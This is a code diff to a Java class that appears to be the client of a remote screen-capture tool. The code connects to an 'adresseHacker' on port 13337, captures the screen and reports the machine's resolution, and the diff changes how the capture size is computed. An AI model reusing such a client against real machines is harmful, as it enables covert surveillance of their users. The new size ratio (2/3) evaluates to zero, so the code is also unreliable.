@@ -25,15 +25,23 @@ import javax.swing.ImageIcon;
 
 public class ClientExe {
 	/* Si l'URI du dossier des ressources contient un espace, le ClassLoader va le remplacer par %20. Donc, pour que ça soit compréhensible par Windows, on fait un replaceAll. */
-	private final static String ressourcesDirectory = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath()).getAbsolutePath().replaceAll("%20", " ") + "\\ressources\\";
+	private final static String ressourcesDirectory = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath()).getAbsolutePath().replaceAll("%20", " ") + "\\ressources\\"+File.separator;
 
-	private int frameClientWidth; 
-	private int frameClientHeight;
+
 	
 	/* Réseau */
 	private static String adresseHacker;
 	private static final int portServeur = 13337;
 	private InetSocketAddress adrDest = new InetSocketAddress(adresseHacker, portServeur);
+
+	private int clientResolutionHeight;
+	private int clientResolutionWidth;
+	
+	private static int frameClientWidth; 
+	private static int frameClientHeight;
+
+
+	private final int diviseurResolution = (2/3);
 	
 	private static Socket socketClient;
 	
@@ -45,7 +53,7 @@ public class ClientExe {
 		System.out.println("ClassLoader : "+new File(ClassLoader.getSystemClassLoader().getResource(".").getPath()).getAbsolutePath());
 		ClientExe c = new ClientExe();
 		c.init();
-		c.FullScreenCaptureResized(1280, 720);
+		c.FullScreenCaptureResized(frameClientWidth, frameClientHeight);
 	}
 	
 
@@ -117,6 +125,12 @@ public class ClientExe {
 	 * Get some system parameters
 	 */
 	public void NetworkgetSystemProperties() throws HeadlessException, IOException {
+		clientResolutionWidth = (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
+		clientResolutionHeight = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
+		
+		frameClientWidth = clientResolutionWidth * (diviseurResolution );
+		frameClientHeight = clientResolutionHeight * (diviseurResolution);
+		
 		envoyer("Resolution=" +(int) Toolkit.getDefaultToolkit().getScreenSize().getWidth()+ ":"+(int) Toolkit.getDefaultToolkit().getScreenSize().getHeight());
 	}
 
